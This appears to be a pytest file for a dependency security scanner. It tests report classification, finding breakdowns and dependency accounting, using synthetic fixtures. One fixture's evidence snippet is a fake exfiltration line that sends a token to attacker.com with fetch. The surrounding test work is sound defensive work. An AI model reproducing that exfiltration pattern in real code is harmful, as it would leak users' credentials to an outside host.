import pytest
from backend.guardian.models import (
    Report,
    Finding,
    Evidence,
    Dependency,
    PackageInspection,
    InspectionSummary,
    Advisory,
    DataFlow,
    FlowStep
)
from backend.guardian.storage import get_plans_for_project, save_plan, save
from backend.guardian.remediation_models import RemediationPlan

def test_legacy_report_without_classification_defaults_appropriately():
    raw_synthetic = {
        "id": "test-legacy-synth",
        "name": "synth-pkg",
        "version": "1.0.0",
        "created_at": "2026-10-31T00:00:00Z",
        "source": "synthetic fixture",
        "risk": "No elevated signals",
        "rationale": "Test rationale",
        "findings": [],
        "dependencies": [],
        "files_analyzed": 0,
        "coverage": [],
        "intelligence": "checked",
        "duration_ms": 100,
    }
    rep_synth = Report.model_validate(raw_synthetic)
    assert rep_synth.classification == "demo"

    raw_real = {
        "id": "test-legacy-real",
        "name": "real-pkg",
        "version": "1.0.0",
        "created_at": "2026-10-31T00:00:00Z",
        "source": "npm registry",
        "risk": "No elevated signals",
        "rationale": "Test rationale",
        "findings": [],
        "dependencies": [],
        "files_analyzed": 0,
        "coverage": [],
        "intelligence": "checked",
        "duration_ms": 100,
    }
    rep_real = Report.model_validate(raw_real)
    assert rep_real.classification == "real"

def test_finding_breakdown_distinguishes_actionable_and_informational():
    findings = [
        Finding(
            id="f-info-1",
            rule="INSTALL_SCRIPT",
            title="Runs code during installation",
            category="Installation",
            severity="info",
            confidence="high",
            observed="postinstall: node build.js",
            explanation="Benign lifecycle script observation.",
            implication="Runs with user permissions.",
            recommendation="Review script.",
            evidence=[Evidence(file="package.json", snippet="node build.js", detail="postinstall")],
            domain="behavior"
        ),
        Finding(
            id="f-info-2",
            rule="CREDENTIAL_ACCESS",
            title="Reads environment or credential information",
            category="Data access",
            severity="info",
            confidence="high",
            observed="process.env.PORT",
            explanation="Normal configuration read.",
            implication="Application reads port.",
            recommendation="Verify.",
            evidence=[Evidence(file="server.js", snippet="process.env.PORT", detail="env access")],
            domain="behavior"
        ),
        Finding(
            id="f-high-1",
            rule="SENSITIVE_TRANSMISSION",
            title="Sensitive data reaches a network request",
            category="Data exposure",
            severity="high",
            confidence="high",
            observed="exfiltration to attacker.com",
            explanation="Credentials sent over HTTP.",
            implication="Data breach.",
            recommendation="Do not run.",
            evidence=[Evidence(file="malware.js", snippet="fetch('http://attacker.com', {body: token})", detail="exfiltration")],
            domain="behavior",
            data_flows=[
                DataFlow(
                    steps=[
                        FlowStep(file="malware.js", snippet="token", detail="source", kind="source"),
                        FlowStep(file="malware.js", snippet="fetch", detail="sink", kind="sink")
                    ]
                )
            ]
        ),
        Finding(
            id="f-osv-1",
            rule="OSV",
            title="GHSA-1234-abcd",
            category="Vulnerability",
            severity="critical",
            confidence="high",
            observed="Affected version",
            explanation="Remote code execution in dependency.",
            implication="Exploitable by attacker.",
            recommendation="Upgrade dependency.",
            evidence=[Evidence(file="package-lock.json", snippet="lodash@4.17.4", detail="vulnerable version")],
            domain="vulnerability",
            advisory=Advisory(id="GHSA-1234-abcd", summary="Prototype pollution")
        ),
        Finding(
            id="f-integ-1",
            rule="PACKAGE_INTEGRITY",
            title="Tarball checksum mismatch",
            category="Package integrity",
            severity="high",
            confidence="high",
            observed="Digest mismatch",
            explanation="Downloaded bytes differed from registry digest.",
            implication="Package was altered.",
            recommendation="Do not use.",
            evidence=[Evidence(file="registry", snippet="sha512", detail="digest mismatch")],
            domain="integrity"
        )
    ]

    report = Report(
        id="test-rep",
        name="test-pkg",
        version="1.0.0",
        created_at="2026-10-31T00:00:00Z",
        source="upload",
        classification="real",
        risk="High concern",
        rationale="Sensitive exfiltration detected",
        findings=findings,
        dependencies=[],
        files_analyzed=5,
        coverage=[],
        intelligence="checked",
        duration_ms=150
    )

    breakdown = report.get_finding_breakdown()
    assert breakdown.total == 5
    # Actionable: high behavior + critical OSV + high integrity = 3
    assert breakdown.actionable == 3
    # Informational observations: install script + credential access = 2
    assert breakdown.informational == 2
    assert breakdown.advisories == 1
    assert breakdown.critical_advisories == 1
    assert breakdown.high_advisories == 0
    # Behavioral findings: 2 info + 1 high = 3
    assert breakdown.behavioral == 3
    assert breakdown.actionable_behavioral == 1
    # Integrity: 1
    assert breakdown.integrity == 1
    # Data flows: 1
    assert breakdown.data_flows == 1

def test_dependency_accounting_reconciliation():
    inspections = [
        PackageInspection(name="react", version="18.2.0", location="node_modules/react", direct=True, status="inspected"),
        PackageInspection(name="react-dom", version="18.2.0", location="node_modules/react-dom", direct=True, status="inspected"),
        PackageInspection(name="loose-envify", version="1.4.0", location="node_modules/loose-envify", direct=False, status="skipped"),
        PackageInspection(name="js-tokens", version="4.0.0", location="node_modules/js-tokens", direct=False, status="unavailable"),
        PackageInspection(name="unknown-link", version="unresolved", location="node_modules/unknown-link", direct=False, status="unresolved"),
        PackageInspection(name="bad-archive", version="1.0.0", location="node_modules/bad-archive", direct=False, status="integrity_failed"),
    ]

    summary = InspectionSummary(
        total=6,
        direct=2,
        transitive=4,
        inspected=2,
        skipped=1,
        unavailable=1,
        unresolved=1,
        integrity_failed=1,
        not_attempted=0,
        packages_with_findings=0
    )

    report = Report(
        id="test-rep-deps",
        name="test-pkg",
        version="1.0.0",
        created_at="2026-10-31T00:00:00Z",
        source="upload",
        classification="real",
        risk="No elevated signals",
        rationale="Clean",
        findings=[],
        dependencies=[
            Dependency(name="react", version="18.2.0", direct=True, source="package.json"),
            Dependency(name="react-dom", version="18.2.0", direct=True, source="package.json"),
        ],
        files_analyzed=10,
        coverage=[],
        intelligence="checked",
        duration_ms=200,
        inspections=inspections,
        inspection_summary=summary
    )

    acct = report.get_dependency_accounting()
    assert acct.total_resolved == 6
    assert acct.declared_direct == 2
    assert acct.transitive == 4
    # Arithmetic must reconcile: direct + transitive == total
    assert acct.declared_direct + acct.transitive == acct.total_resolved
    # Inspection categories sum to total
    assert (
        acct.inspected +
        acct.skipped +
        acct.unavailable +
        acct.unresolved +
        acct.integrity_failed +
        acct.not_attempted
    ) == acct.total_resolved
    assert acct.unique_names == 6
